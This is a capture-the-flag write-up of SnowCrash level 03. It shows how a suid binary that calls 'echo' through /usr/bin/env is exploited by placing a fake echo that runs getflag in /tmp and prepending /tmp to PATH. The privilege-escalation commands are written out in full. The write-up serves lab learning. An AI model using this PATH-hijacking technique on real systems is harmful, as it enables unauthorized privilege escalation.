# LEVEL 03

## Vulnerability & exploit

Env invocation by a privileged user -> Privilege escalation by providing replacement to built-in command

## External resources

ltrace

## Initial Context

In our home directory, we have an executable with suid/guid:

```
level03@SnowCrash:~$ ls -l level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

## Solving the challenge

Let's try to exploit the binary as instructed, by using the ltrace debugger:

```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                               = 2003
geteuid()                                                               = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 0
+++ exited (status 0) +++
```

As discussed [here](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code), we see that the program does a system call to run echo using /usr/bin/env.
The man (`info coreutils 'env invocation'`) tells us that:

> The first operand that does not contain the character '=' specifies the program to invoke; it is searched for according to the 'PATH' environment variable.
> and that
> Modifications to 'PATH' take effect prior to searching for COMMAND.

It even gives us a hacking tip:

> Run `foo' with the environment containing `LOGNAME=rms', `EDITOR=emacs', and `PATH=.:/gnubin:/hacks', and guarantees that `foo' was found in the file system rather than as a shell built-in.
> env foo

To recap: the program will start by setting the environment before running the echo command.

The bash man here provides some useful information:

> If the name is neither a shell function nor a builtin, and contains no slashes, bash searches each element
> of the PATH for a directory containing an executable file by that name.

So we have to create our own echo executable file, and make sure that it's found before the original echo executable.
Since the file has the suid bit set, all commands will be run with the rights of the file owner (flag03) - so we'd like to trick the program into running `getflag` instead of `echo`.

```
level03@SnowCrash:~$ echo getflag > /tmp/echo && chmod +x /tmp/echo
```

Then, we instruct bash to look for the executable in /tmp first by adding /tmp at the beginning of the \$PATH environment variable:

```
level03@SnowCrash:~$ export PATH=/tmp:$PATH && echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Finally, run the executable to get the token for level04:

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXX
```
